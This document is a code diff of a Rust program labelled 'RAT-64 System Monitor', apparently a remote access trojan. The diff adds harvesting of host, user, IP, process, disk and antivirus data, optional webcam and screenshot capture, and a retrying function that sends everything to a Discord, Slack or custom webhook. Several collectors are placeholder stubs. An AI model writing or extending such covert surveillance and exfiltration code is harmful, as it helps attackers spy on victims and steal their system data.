@@ -1,4 +1,5 @@
 use std::fs::File;
+use std::io::Read;
 
 pub mod decrypt;
 use std::io::Write;
@@ -12,6 +13,7 @@ use sysinfo::System;
 use aes_gcm::{Aes256Gcm, Nonce};
 use aes_gcm::aead::{Aead, KeyInit};
 use rand::Rng;
+use std::time::Duration;
 
 
 #[derive(Serialize, Deserialize, Debug)]
@@ -26,10 +28,88 @@ struct SystemInfo {
     security_software: Vec<String>,
     processor: String,
     country_code: String,
+    // 新しい詳細情報
+    total_memory: u64,
+    available_memory: u64,
+    disk_info: Vec<DiskInfo>,
+    network_interfaces: Vec<NetworkInterface>,
+    running_processes: Vec<ProcessInfo>,
+    installed_software: Vec<String>,
+    startup_programs: Vec<String>,
+    system_uptime: u64,
+    timezone: String,
+    language: String,
+    architecture: String,
+    boot_time: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct DiskInfo {
+    name: String,
+    file_system: String,
+    total_space: u64,
+    available_space: u64,
+    mount_point: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct NetworkInterface {
+    name: String,
+    ip_addresses: Vec<String>,
+    mac_address: String,
+    is_up: bool,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct ProcessInfo {
+    name: String,
+    pid: u32,
+    cpu_usage: f32,
+    memory_usage: u64,
+    exe_path: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+struct Config {
+    webhook_url: Option<String>,
+    webhook_type: WebhookType,
+    collect_screenshots: bool,
+    collect_webcam: bool,
+    collect_processes: bool,
+    collect_software: bool,
+    max_processes: usize,
+    retry_attempts: u32,
+    timeout_seconds: u64,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+enum WebhookType {
+    Discord,
+    Slack,
+    Custom,
+    None,
+}
+
+impl Default for Config {
+    fn default() -> Self {
+        Config {
+            webhook_url: None,
+            webhook_type: WebhookType::None,
+            collect_screenshots: true,
+            collect_webcam: false,
+            collect_processes: true,
+            collect_software: true,
+            max_processes: 20,
+            retry_attempts: 3,
+            timeout_seconds: 30,
+        }
+    }
 }
 
 fn get_system_info() -> SystemInfo {
-    let sys = sysinfo::System::new_all();
+    let mut sys = sysinfo::System::new_all();
+    sys.refresh_all();
+    
     // Hostname
     let hostname = whoami::fallible::hostname().unwrap_or_default();
 
@@ -45,8 +125,7 @@ fn get_system_info() -> SystemInfo {
 
     // Global IP
     let global_ip = reqwest::blocking::get("https://api.ipify.org")
-        .unwrap()
-        .text()
+        .and_then(|r| r.text())
         .unwrap_or_default();
 
     // Local IP
@@ -54,18 +133,45 @@ fn get_system_info() -> SystemInfo {
 
     // CPU Cores & Processor
     let cores = sys.cpus().len();
-    let processor = System::physical_core_count()
-        .map(|_| sys.cpus().get(0).map_or("Unknown".to_string(), |c| c.brand().to_string()))
-        .unwrap_or("Unknown".to_string());
+    let processor = sys.cpus().first()
+        .map(|cpu| cpu.brand().to_string())
+        .unwrap_or_default();
 
     // Country code
     let country_code = reqwest::blocking::get("https://ipapi.co/country/")
-        .unwrap()
-        .text()
+        .and_then(|r| r.text())
         .unwrap_or_default();
 
-    // Antivirus software (Windows only)
+    // Security software
     let security_software = get_antivirus_software();
+
+    // Memory info
+    let total_memory = sys.total_memory();
+    let available_memory = sys.available_memory();
+
+    // Disk info
+    let disk_info = get_disk_info(&sys);
+
+    // Network interfaces
+    let network_interfaces = get_network_interfaces();
+
+    // Running processes
+    let running_processes = get_running_processes(&sys);
+
+    // Installed software
+    let installed_software = get_installed_software();
+
+    // Startup programs
+    let startup_programs = get_startup_programs();
+
+    // System uptime (approximate from sysinfo)
+    let system_uptime = 0; // Placeholder - sysinfo doesn't have direct uptime method
+
+    // System info
+    let timezone = std::env::var("TZ").unwrap_or_else(|_| "UTC".to_string());
+    let language = std::env::var("LANG").unwrap_or_else(|_| "en_US".to_string());
+    let architecture = std::env::consts::ARCH.to_string();
+    let boot_time = "Unknown".to_string(); // Placeholder
 
     SystemInfo {
         hostname,
@@ -78,6 +184,18 @@ fn get_system_info() -> SystemInfo {
         security_software,
         processor,
         country_code,
+        total_memory,
+        available_memory,
+        disk_info,
+        network_interfaces,
+        running_processes,
+        installed_software,
+        startup_programs,
+        system_uptime,
+        timezone,
+        language,
+        architecture,
+        boot_time,
     }
 }
 
@@ -101,6 +219,166 @@ fn get_antivirus_software() -> Vec<String> {
     } else {
         vec![]
     }
+}
+
+fn get_disk_info(_sys: &sysinfo::System) -> Vec<DiskInfo> {
+    // Use sysinfo's Disks struct instead
+    use sysinfo::Disks;
+    let disks = Disks::new_with_refreshed_list();
+    disks.iter().map(|disk| {
+        DiskInfo {
+            name: disk.name().to_string_lossy().to_string(),
+            file_system: disk.file_system().to_string_lossy().to_string(),
+            total_space: disk.total_space(),
+            available_space: disk.available_space(),
+            mount_point: disk.mount_point().to_string_lossy().to_string(),
+        }
+    }).collect()
+}
+
+fn get_network_interfaces() -> Vec<NetworkInterface> {
+    // Simplified implementation - would use network interfaces library
+    vec![NetworkInterface {
+        name: "Default".to_string(),
+        ip_addresses: vec![local_ipaddress::get().unwrap_or_default()],
+        mac_address: "Unknown".to_string(),
+        is_up: true,
+    }]
+}
+
+fn get_running_processes(sys: &sysinfo::System) -> Vec<ProcessInfo> {
+    sys.processes().iter().take(20).map(|(pid, process)| {
+        ProcessInfo {
+            name: process.name().to_string_lossy().to_string(),
+            pid: pid.as_u32(),
+            cpu_usage: process.cpu_usage(),
+            memory_usage: process.memory(),
+            exe_path: process.exe()
+                .map(|p| p.to_string_lossy().to_string())
+                .unwrap_or_else(|| "Unknown".to_string()),
+        }
+    }).collect()
+}
+
+fn get_installed_software() -> Vec<String> {
+    // Simplified implementation - would query registry on Windows
+    vec!["System Default Applications".to_string()]
+}
+
+fn get_startup_programs() -> Vec<String> {
+    // Simplified implementation - would check startup folders and registry
+    vec!["System Startup Programs".to_string()]
+}
+
+fn load_config() -> Config {
+    match std::fs::read_to_string("config.json") {
+        Ok(content) => serde_json::from_str(&content).unwrap_or_default(),
+        Err(_) => {
+            let default_config = Config::default();
+            create_default_config(&default_config);
+            default_config
+        }
+    }
+}
+
+fn create_default_config(config: &Config) {
+    if let Ok(json) = serde_json::to_string_pretty(config) {
+        let _ = std::fs::write("config.json", json);
+        println!("設定ファイル config.json を作成しました");
+    }
+}
+
+fn send_webhook(config: &Config, system_info: &SystemInfo, screenshot: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let webhook_url = match &config.webhook_url {
+        Some(url) => url,
+        None => return Ok(()), // Webhook URLが設定されていない場合はスキップ
+    };
+
+    let client = Client::builder()
+        .timeout(Duration::from_secs(config.timeout_seconds))
+        .build()?;
+
+    let payload = match config.webhook_type {
+        WebhookType::Discord => create_discord_payload(system_info, screenshot),
+        WebhookType::Slack => create_slack_payload(system_info, screenshot),
+        WebhookType::Custom => create_custom_payload(system_info, screenshot),
+        WebhookType::None => return Ok(()),
+    };
+
+    for attempt in 1..=config.retry_attempts {
+        match client.post(webhook_url).header("Content-Type", "application/json").body(payload.to_string()).send() {
+            Ok(response) if response.status().is_success() => {
+                println!("✅ Webhook送信成功 ({}回目の試行)", attempt);
+                return Ok(());
+            }
+            Ok(response) => {
+                println!("⚠️  Webhook送信失敗: {} ({}回目の試行)", response.status(), attempt);
+            }
+            Err(e) => {
+                println!("❌ Webhook送信エラー: {} ({}回目の試行)", e, attempt);
+            }
+        }
+        
+        if attempt < config.retry_attempts {
+            std::thread::sleep(Duration::from_secs(2));
+        }
+    }
+    
+    Err("Webhook送信に失敗しました".into())
+}
+
+fn create_discord_payload(system_info: &SystemInfo, screenshot: &str) -> serde_json::Value {
+    serde_json::json!({
+        "embeds": [{
+            "title": "🖥️ システム情報レポート",
+            "color": 0x00ff00,
+            "fields": [
+                {"name": "ホスト名", "value": system_info.hostname, "inline": true},
+                {"name": "OS", "value": format!("{} {}", system_info.os_name, system_info.os_version), "inline": true},
+                {"name": "ユーザー", "value": system_info.username, "inline": true},
+                {"name": "CPU", "value": format!("{} ({} cores)", system_info.processor, system_info.cores), "inline": true},
+                {"name": "メモリ", "value": format!("{:.1} GB / {:.1} GB", 
+                    system_info.available_memory as f64 / 1024.0 / 1024.0 / 1024.0,
+                    system_info.total_memory as f64 / 1024.0 / 1024.0 / 1024.0), "inline": true},
+                {"name": "IP", "value": format!("🌐 {} | 🏠 {}", system_info.global_ip, system_info.local_ip), "inline": true},
+                {"name": "プロセス数", "value": system_info.running_processes.len().to_string(), "inline": true},
+                {"name": "セキュリティ", "value": system_info.security_software.join(", "), "inline": true}
+            ],
+            "timestamp": std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
+            "footer": {"text": "RAT-64 System Monitor"}
+        }]
+    })
+}
+
+fn create_slack_payload(system_info: &SystemInfo, _screenshot: &str) -> serde_json::Value {
+    serde_json::json!({
+        "blocks": [
+            {
+                "type": "header",
+                "text": {
+                    "type": "plain_text",
+                    "text": "🖥️ システム情報レポート"
+                }
+            },
+            {
+                "type": "section",
+                "fields": [
+                    {"type": "mrkdwn", "text": format!("*ホスト名:*\n{}", system_info.hostname)},
+                    {"type": "mrkdwn", "text": format!("*OS:*\n{} {}", system_info.os_name, system_info.os_version)},
+                    {"type": "mrkdwn", "text": format!("*ユーザー:*\n{}", system_info.username)},
+                    {"type": "mrkdwn", "text": format!("*CPU:*\n{} ({} cores)", system_info.processor, system_info.cores)}
+                ]
+            }
+        ]
+    })
+}
+
+fn create_custom_payload(system_info: &SystemInfo, screenshot: &str) -> serde_json::Value {
+    serde_json::json!({
+        "timestamp": std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs(),
+        "system_info": system_info,
+        "screenshot": if screenshot.is_empty() { serde_json::Value::Null } else { serde_json::Value::String(screenshot.to_string()) }
+    })
 }
 
 fn get_screenshot_base64() -> String {
